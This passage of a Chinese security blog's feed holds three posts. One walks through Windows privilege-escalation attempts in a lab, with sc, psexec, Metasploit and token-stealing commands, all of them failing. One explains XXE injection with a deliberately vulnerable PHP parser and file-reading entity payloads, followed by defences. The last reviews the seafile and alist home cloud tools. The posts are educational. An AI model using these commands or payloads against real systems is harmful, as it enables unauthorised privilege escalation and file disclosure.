    <content type="html"><![CDATA[<h1 id="序">序</h1><p>本来兴致勃勃的想要学一下内网横向渗透的,结果发现其他人随随便便用永恒之蓝就直接拿到了system权限,但同样的靶机,自己电脑上的永恒之蓝完全没用,于是干脆复习了一遍window下的权限提升方法。<br>（本文主要是针对windows提权方法进行总结,在实验中以win7为例,采用的提权方法均<strong>失败</strong>了,想要看到成功截图的请移步其他大佬的博客）<br>靶机是<code>win7</code>的系统,登录的账户为<code>demo\douser</code>,是demo域下的一个普通域成员</p><h1 id="系统内核溢出漏洞提权">系统内核溢出漏洞提权</h1><p>使用msf的<code>post/windows/gather/enum_patches</code>模块搜索系统中缺少的补丁<br><img src="4f5f00b6bc3347f0a86236345577d948.png" alt=""><br>好家伙,补丁全打上了<br>用<code>post/multi/recon/local_exploit_suggester</code>查看可以利用的漏洞模块<br><img src="29f8aed66ddd45d1b57263ce119d4b63.png" alt="">尝试了给出的几种攻击模块,全部失败</p><h1 id="计划任务">计划任务</h1><p>windows中用来执行计划任务的无疑是<code>at</code>和<code>schtasks</code>命令,然而从 Windows Vista 开始,Microsoft 已经不再推荐使用“at”命令来创建计划任务,并且在后续的 Windows 版本中将其标记为“弃用”。所以在win7上我们通过schtasks来尝试提升权限<br><img src="15572ce9a95744a6b28854fa6f7c9db4.png" alt=""><br>当前用户并没有操作schtasks的权限,虽然at命令被弃用了,但事实上除了win11以外,<strong>其他的从 Windows Vista 到win10都是可以使用at创建计划任务的</strong>,只不过无法使用/interactive交互式任务。<br><img src="52a4639ce69045dc855e9507b259c634.png" alt="在win11上使用at"><br><img src="83d55d15bd394f53a7d75c7ad3a6c1a8.png" alt="在win2008中使用at"><br>所以对于win7我们依旧可以上传木马到目标机器,同时msf开启监听,利用at执行木马,就会返回一个system权限的shell<br>但是这里我们依旧没有使用at的权限<br><img src="310523a50df24e6db0f04723766a6e7a.png" alt="在win7上使用at"></p><h1 id="sc提权">sc提权</h1><p>之前一直以为sc提权就是schtasks计划任务（主要是schtasks的首字母就是sc）,实际上二者没啥关系。</p><p><code>sc 命令</code>是 Windows 操作系统中的一个命令行工具,用于配置和管理 Windows 服务。在一些情况下,可以使用 sc 命令进行提权,例如将一个普通用户权限的服务修改为 LocalSystem 账户权限。</p><p>这种提权的原理是因为在 Windows 系统中,服务通常使用某个特定的账户来运行,如果该账户拥有较高的权限,那么相应的服务也就具备了这些权限。因此,通过使用 sc 命令修改服务所使用的账户,可以实现提升服务权限的目的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc Create systemcmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">其中systemcmd是服务名称,大家可以随意填写,binpath是启动的命令,<span class="built_in">type</span>=own是指服务这个服务属于谁,<span class="built_in">type</span>=interact。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里再解释一下 cmd/k start 这个命令,这个命令就是启动一个新的cmd窗口。</span></span><br><span class="line"></span><br><span class="line">sc start systemcmd #启动服务！</span><br></pre></td></tr></table></figure><p>然而依旧没有sc的使用权限<br><img src="1da3fa294d7c4883b1cfa606d14eb060.png" alt=""></p><h1 id="PS提权">PS提权</h1><p><code>PsExec</code>是 Sysinternals 工具包中的一款命令行实用程序,可以在远程计算机上执行进程,并且可以在一定程度上提升权限。它的提权原理主要是通过以下步骤实现：</p><blockquote><p>1、使用<code>管理员凭据</code>登录到目标计算机。<br>2、将 PsExec 所在的计算机上的可执行文件和其他必需的文件复制到目标计算机上,并确保这些文件可以被管理员访问。<br>3、执行 PsExec 命令,并将要运行的程序或脚本等作为参数传递给 PsExec。此时,PsExec 会先以管理员权限在目标计算机上启动一个服务（<code>PsExecSvc</code>）,并向该服务发送要执行的命令。<br>4、在 PsExecSvc 的帮助下,PsExec 实际上是利用<code>Windows 远程过程调用（RPC）</code>机制来在目标计算机上创建了一个新的进程,并以管理员权限运行该进程。这个新进程就相当于是已经进行了提权操作的进程。</p></blockquote><p>提权命令：<code>psexec.exe -accepteula -s -i -d cmd.exe</code><br>我们这里登录的账户并不是管理员,所以寄了<br><img src="e41d4c46fa6245148dea3cea271cdbad.png" alt=""></p><h1 id="BypassUAC">BypassUAC</h1><p><code>UAC（用户账户控制）</code>是从 Windows Vista 开始引入的一种安全功能,可以限制应用程序和用户对计算机系统的更改,并将管理员权限的请求提示给用户以确认。其工作原理如下：</p><blockquote><p>1、当需要执行某个需要管理员权限的操作时,应用程序或用户会向 UAC 发送请求。<br>2、UAC 首先会检查当前用户的访问权限,并根据需要弹出一个用户界面,提示用户输入管理员凭据（用户名和密码）。<br>3、如果用户输入正确的管理员凭据,UAC 就会创建一个新的安全令牌（Token）,其中包含了管理员权限。这个新的令牌称为 Elevated Token。<br>4、应用程序或用户在接下来的操作中就可以使用 Elevated Token 所具有的管理员权限来执行高级任务,例如修改系统设置、安装软件等。<br>需要注意的是,当使用 Elevated Token 时,应用程序或用户仍然受到 UAC 的监控和限制。如果要执行敏感操作,建议在操作后立即取消 Elevated Token 权限,以降低系统风险。</p></blockquote><p>在msf中集成了bypassuac模块,但我们提权的时候,当前用户必须在<code>管理员组</code>中,且UAC必须为默认设置（即“<code>仅在程序试图更改我的计算机时通知我</code>”）<br><img src="985d2a3964114cf0983a711a09f33498.png" alt=""><br>果然还是失败了</p><h1 id="令牌窃取">令牌窃取</h1><p><code>令牌窃取（Token Stealing）</code>是一种攻击技术,可以使用操作系统中的特权漏洞或恶意软件等手段来获取其他进程或用户的<code>安全令牌（Security Token）</code>,从而获得对系统资源和权限的访问控制。</p><p>Kerberos 是 Windows 系统中一个常用的身份验证协议,可以帮助用户在不安全的网络环境中建立安全信任关系,并防止密码被破解或监听等威胁。然而,如果系统中存在 Kerberos 相关的漏洞或错误,攻击者可以利用这些漏洞或错误来进行令牌窃取攻击。</p><p>在 Windows 操作系统中,每个登录用户都会拥有一个唯一的安全令牌,该令牌包含了用户的身份信息、权限等,并且可以被用于身份验证、授权、进程通信等场景下的安全标识和传递。与此同时,在 Kerberos 认证过程中,当用户向 Kerberos 服务器发送凭据请求（TGT 请求）后,Kerberos 服务器将返回一个包含用户身份信息和授权信息的 Kerberos 票据。该票据也可以被视为一种安全令牌,并且能够帮助用户在其他服务或应用程序中进行身份验证和访问控制。</p><p>我们在拿到win7的shell以后可以通过<code>use incognito</code>和<code>list_tokens -u</code>来列出可用的令牌<br><img src="75e4950571944ccd8ab2246406ae3f71.png" alt=""><br>明显这里只有demo/douser的令牌,所以令牌窃取无效</p><h1 id="最后">最后</h1><p>暂时能想到的提权方法就这么多了,实际上也可以使用Powershell的提权脚本<code>Powerup</code>,但这里win7默认是禁止使用Powershell脚本的,并且当前账户也没有权限对其进行修改,所以GG了<br><img src="6f0e512152a54f92b8baa3e0c96f47a4.png" alt=""></p><p>大佬们有什么方法欢迎评论告知</p><p>参考：<br><a href="https://blog.csdn.net/weixin_40412037/article/details/121535553">https://blog.csdn.net/weixin_40412037/article/details/121535553</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;序&quot;&gt;序&lt;/h1&gt;
&lt;p&gt;本来兴致勃勃的想要学一下内网横向渗透的,结果发现其他人随随便便用永恒之蓝就直接拿到了system权限,但同样的靶机,自己电脑上的永恒之蓝完全没用,于是干脆复习了一遍window下的权限提升方法。&lt;br&gt;
（本文主要是针对windows提权</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="http://example.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞详解</title>
    <link href="http://example.com/post/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    <id>http://example.com/post/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</id>
    <published>2023-02-22T07:57:28.000Z</published>
    <updated>2023-06-14T11:57:18.881Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介">简介</h1><p>XXE(XML External Entity Injection) <code>XML外部实体注入</code>,之前听这个词听过很多次了,但由于平日里不管是ctf比赛或者是src遇到的都不多,所以一直没有详细的了解过,趁着假期空闲,决定好好学一下这方面的知识。</p><p>XML一般可以用来做数据传输和数据存储,其传输功能和JSON类似,但现在基本使用JSON,很少使用XML,因为XML使用起来太“重”了,而外部实体引入是XML的一个正常功能,但如果在引入时,注入了恶意的外部实体,但本地对注入的外部实体未做严格校验,这时就会出现XXE漏洞。</p><h1 id="XML基础">XML基础</h1><p>要明白XXE,我们可以首先从XML基础学起。</p><p>一个XML文档结构包括、<code>XML声明、文档类型定义DTD（可选）、文档元素</code>。</p><p>例如下面这一段就是标准的XML文档</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">user</span> (<span class="keyword">username</span>, <span class="keyword">password</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">username</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">password</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="4d4d27c0633b434f8243f7d8b50a5ce2.png" alt=""></p><p>通过DTD可以验证XML是否符合正确的语法规则 （DTD实际上类似一段说明文字,说明XML文档的组成元素及结构,如果这里将DTD中的username改为name,打开XML文档并不会报错,只是不符合DTD中定义的语法规则）,DTD可以本地声明,也可以外部引用,而XXE主要就是从DTD入手。</p><h1 id="DTD实体">DTD实体</h1><p>实体是<code>用于定义引用普通文本或特殊字符的快捷方式的变量</code>,可在内部或外部进行声明。</p><p>实体包括<code>一般实体</code>和<code>参数实体</code>,为防止大家被绕晕,这里我们只讲一般实体。</p><p>一般实体声明方式：<code>&lt;!ENTITY 名字 '内容'&gt;</code></p><p>使用方式：<code>&amp;名字;</code></p><p>例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="string">&quot;admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在浏览器中打开</p><p><img src="470a490266c14d9d8af3bc61cca3c847.png" alt=""></p><p>而外部实体声明方式为： <code>&lt;!ENTITY 名字 SYSTEM &quot;URI/URL&quot;&gt;</code></p><p>例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;admin.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>admin.txt中的内容如下<br><img src="2f42b5236de848d99d31ff0d72379852.png" alt=""></p><p>在IE8浏览器(其他浏览器显示不出来)中打开</p><p><img src="3043d1c444e2426fbcede512168256e4.png" alt=""></p><p>同时在引用外部实体时,可以使用不同的协议类型来引用 ：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///path/file.txt</span><br><span class="line">http://url/file.txt</span><br><span class="line">php://filter/read=convert.base64-encode/resource=file.txt</span><br></pre></td></tr></table></figure><p>聪明的你们一定已经发现了,只要将admin.txt换成其他文件,就可以实现文件的任意读取了</p><h1 id="PHP中的XML">PHP中的XML</h1><p>php中常见的与XML有关的函数是 <code>simplexml_load_string</code></p><p>其用法为 <code>simplexml_load_file(string,class,options,ns,is_prefix)</code></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要使用的 XML 字符串。</td></tr><tr><td>class</td><td>可选。规定新对象的 class。</td></tr><tr><td>options</td><td>可选。规定附加的 Libxml 参数。</td></tr><tr><td>ns</td><td>可选。</td></tr><tr><td>is_prefix</td><td>可选。</td></tr></tbody></table><p>一个简单的例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">//通过php伪协议直接接收POST传参</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>, <span class="string">&quot;SimpleXMLElement&quot;</span>, LIBXML_NOENT);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;username;</span><br></pre></td></tr></table></figure><p>利用XXE读取log.txt的内容<br><img src="4d7a3d360f154acc92b406c30ac7e9e3.png" alt=""></p><h1 id="防御">防御</h1><p>XXE的防御一般通过两种方式<br>1.使用开发语言提供的禁用外部实体的方法, 例如php中使用<code>libxml_disable_entity_loader(true)</code><br>2.对用户输入的内容进行过滤,过滤掉<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>,或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;简介&lt;/h1&gt;
&lt;p&gt;XXE(XML External Entity Injection) &lt;code&gt;XML外部实体注入&lt;/code&gt;,之前听这个词听过很多次了,但由于平日里不管是ctf比赛或者是src遇到的都不多,所以一直没有详细的了解过,趁着假期空闲</summary>
      
    
    
    
    <category term="技术" scheme="http://example.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="xxe" scheme="http://example.com/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>seafile和alist使用体验</title>
    <link href="http://example.com/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/"/>
    <id>http://example.com/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</id>
    <published>2023-02-11T06:18:09.000Z</published>
    <updated>2023-02-20T04:36:08.386Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景">背景</h3><p>家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的<strong>私人网盘</strong></p><p><img src="https://img-blog.csdnimg.cn/b714094e70284d59a3211d8279c39bdb.jpg" alt="b714094e70284d59a3211d8279c39bdb.jpg"  /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h3 id="seafile">seafile</h3><p>一开始只对seafile有了解，所以没有考虑其他的网盘系统就直接开始搭建seafile了，seafile的部署和使用比较简单，在win7上部署可以参考下面这位大佬的文章（要自己去获取seafile-server_5.0.3_win32.tar.gz的资源）</p><p><a href="https://blog.csdn.net/wwwwestcn/article/details/122424469">https://blog.csdn.net/wwwwestcn/article/details/122424469</a></p><p>seafile在windows上的搭建方法比较简单，整个过程没有遇到什么太难的问题，接下来就我自己的体验来谈谈seafile的优缺点</p><p>优点：</p><p>​    1.支持<strong>多平台客户端</strong>访问、连手机都有专业的app</p><p>​    2.对本地储存的数据进行了<strong>加密</strong>、无法在本地进行查看（这一点因人而异，我认为是优点）</p><p>​    3.访问时必须要输入密码，提高了数据的安全性</p><p>缺点：</p><p>​    1.大于30M的数据只能下载<strong>不能在线预览</strong>，想要线上看视频基本上是不可能的了（这是后来换alist的主要原因）</p><p>​    2.windows版本的<strong>服务端</strong>已经停止更新了，只能自己去找老的版本下载</p><p>​    3.配置有些复杂，访问是用的8000端口、上传是用的8082端口，意味着进行端口转发或者配置反代理服务器的时候需要同时对两个端口进行操作</p><p><img src="https://img-blog.csdnimg.cn/17f9bc567d1d42b9b38de90751182d38.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h3 id="alist">alist</h3><p>发现seafile的缺点以后，就一直在找其他支持预览大体积文件的私人网盘系统，最终看到了其他博主搭建的alist网盘，发现对预览视频大小没有限制就开始部署alist了</p><p>alist的部署更加简单，具体可以看这位博主的文章</p><p><a href="https://blog.csdn.net/weixin_43957923/article/details/128045524">Alist搭建_「已注销」的博客-CSDN博客_alist搭建教程</a></p><p>同样讲一下alist的优缺点</p><p>优点：</p><p>​    1.搭建简单、配置也不麻烦、页面简易美观</p><p>​    2.支持大体积文件的在线预览、不用下载也能观看</p><p>缺点：</p><p>​    1.没有客户端工具只能通过网页端访问资源</p><p>​    2.默认内容对所有访问用户开放、隐私的内容和相关密码需要自己配置</p><p>​    3.可以通过图片视图大致预览图片列表、希望视频也能有个封面查看</p><p>​    4.有点“重”，内容多的话要加载很久</p><p>这里alist的缺点很多，主要也是因为用alist的体验比较久，但目前来说我对alist的使用是比较满意的，并且alist还支持和百度网盘、阿里网盘、onedrive等知名网盘的联动</p><h3 id="alist的安全问题">alist的安全问题</h3><p>利用黑暗搜索引擎对含有alist的特征网页进行搜索</p><p><img src="https://img-blog.csdnimg.cn/d8e57c2b9ad746fabebceedd38332d81.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>可以看到搜索结果多达一万多条，说明使用alist的用户群还是比较大的，而alist搭建过程中如果管理员没有进行特殊配置的话，所上传的内容是默认对所有访客用户开放的，也就是说你上传的文件没有经过隐私处理就直接暴露在了公网上的话，所有人都可以看到你的文件，如果此时又挂载了百度网盘等其他云储存服务，那么这些网盘中的内容也同样是对外开放的，而这些网盘一般都有同步手机信息、相册、聊天记录等功能，所以极易造成个人隐私泄漏</p><p><img src="https://img-blog.csdnimg.cn/c811906dc6474fadbf5ef3751dee8221.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>（上图是搜索结果中随意点开的一个网页，可以看到网页挂载了很多的网盘，网盘里的内容所有人可见）</p><p>为了防止这种隐私泄漏，我们需要对隐私文件进行<strong>加密或隐藏</strong>，加密方法在alist的说明文档中有</p><p><a href="https://alist.nn.ci/zh/guide/advanced/meta.html">元信息 | AList文档 (nn.ci)</a></p><p>同时也可以参考下面这位up主的视频</p><p><a href="https://b23.tv/IYeqcm6">【Alist】Alist的四大功能使用教程_哔哩哔哩_bilibili</a></p><h3 id="最后">最后</h3><p>搭建私人网盘一定要注意个人信息不被泄露，最好不要直接暴露在公网上，想要访问的话可以通过内网穿透工具实现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;背景&quot;&gt;背景&lt;/h3&gt;
&lt;p&gt;家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的&lt;strong&gt;私人网盘&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;im</summary>
      
    
    
    
    <category term="使用体验" scheme="http://example.com/categories/%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/"/>
    
    
    <category term="alist" scheme="http://example.com/tags/alist/"/>
    
    <category term="seafile" scheme="http://example.com/tags/seafile/"/>
    
  </entry>
  
</feed>
